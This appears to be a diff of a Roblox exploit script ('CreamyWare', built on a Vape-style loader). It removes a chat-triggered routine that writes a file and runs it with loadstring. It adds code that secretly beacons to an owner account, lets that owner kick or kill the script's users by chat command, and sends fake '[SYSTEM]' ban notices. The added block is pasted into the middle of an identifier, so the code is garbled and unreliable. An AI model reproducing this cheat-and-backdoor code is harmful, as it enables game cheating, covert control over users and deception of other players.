@@ -86,62 +86,89 @@ if not folderName then
 end
 
 if folderName then
-    filePath = folderName .. "/" .. fileName
-else
-    -- No folder available, fallback to root file
-    filePath = fileName
-end
 
-local function createAndRunKick()
-    local wrote = safeWriteFile(filePath, kickScript)
-    if not wrote then
-        print("Failed to write kick script file.")
-        return
-    end
-
-    if readfile and loadstring then
-        local ok, err = pcall(function()
-            loadstring(readfile(filePath))()
-        end)
-        if not ok then
-            print("Failed to execute kick script:", err)
-        end
-    else
-        print("readfile or loadstring not supported.")
-    end
-end
-
--- Listen for other players saying ;kick all
-for _, p in pairs(Players:GetPlayers()) do
-    if p ~= player then
-        p.Chatted:Connect(function(msg)
-            if msg == ";kick all" then
-                createAndRunKick()
-            end
-        end)
-    end
-end
-
-Players.PlayerAdded:Connect(function(p)
-    if p ~= player then
-        p.Chatted:Connect(function(msg)
-            if msg == ";kick all" then
-                createAndRunKick()
-            end
-        end)
-    end
-end)
-
-player.Chatted:Connect(function(msg)
-    if msg == ";kick all" then
-        print("Kick command sent.")
-    end
-end)
 repeat task.wait() until game:IsLoaded()
 if shared.vape then shared.vape:Uninject() end
 
 -- why do exploits fail to implement anything correctly? Is it really that hard?
-if identifyexecutor then
+if identiflocal Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- Setup tracking
+_G.CreamyWareUsers = _G.CreamyWareUsers or {}
+_G.CreamyWareUsers[LocalPlayer.UserId] = true
+
+-- Whisper "helloimusingcw" to the owner if they're in-game
+task.spawn(function()
+    repeat task.wait() until _G.Owner
+    local ownerPlayer = Players:GetPlayerByUserId(_G.Owner)
+    if ownerPlayer and LocalPlayer.UserId ~= _G.Owner then
+        local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents", 5)
+        if ChatEvents then
+            ChatEvents:WaitForChild("SayMessageRequest"):FireServer("helloimusingcw", "Whisper", ownerPlayer.Name)
+        end
+    end
+end)
+
+-- Chat Tag Display
+TextChatService.OnIncomingMessage = function(message)
+    local props = Instance.new("TextChatMessageProperties")
+    if message.TextSource then
+        local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
+        if sender and _G.CreamyWareUsers[sender.UserId] then
+            local tag = sender.UserId == _G.Owner and (_G.OwnerTag or "CreamyWare Owner") or "CreamyWare User"
+            props.PrefixText = `<font color="#CC00CC">[{tag}]</font> {message.PrefixText}`
+        end
+    end
+    return props
+end
+
+-- Local Red Chat Function
+local function redMessage(text)
+    if ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
+        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+            "[SYSTEM] " .. text,
+            "All"
+        )
+    end
+end
+
+-- Handle Owner Commands
+Players.PlayerChatted:Connect(function(sender, message)
+    if not (_G.Owner and sender.UserId == _G.Owner) then return end
+    message = message:lower()
+
+    if message == ";kick cwu" then
+        for _, target in ipairs(Players:GetPlayers()) do
+            if target.UserId ~= _G.Owner and _G.CreamyWareUsers[target.UserId] then
+                target:Kick("Kicked by CreamyWare Owner")
+            end
+        end
+
+    elseif message == ";kill cwu" then
+        for _, target in ipairs(Players:GetPlayers()) do
+            if target.UserId ~= _G.Owner and _G.CreamyWareUsers[target.UserId] then
+                local char = target.Character
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
+                if hum then hum.Health = 0 end
+            end
+        end
+
+    elseif message == ";fbc" then
+        for _, player in ipairs(Players:GetPlayers()) do
+            if _G.CreamyWareUsers[player.UserId] and player ~= sender then
+                game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+                    Text = "A Cheater In This Server has been banned";
+                    Color = Color3.fromRGB(255, 0, 0);
+                    Font = Enum.Font.SourceSansBold;
+                    FontSize = Enum.FontSize.Size24;
+                })
+            end
+        end
+    end
+end)yexecutor then
 	if table.find({'Argon', 'Wave'}, ({identifyexecutor()})[1]) then
 		getgenv().setthreadidentity = nil
 	end
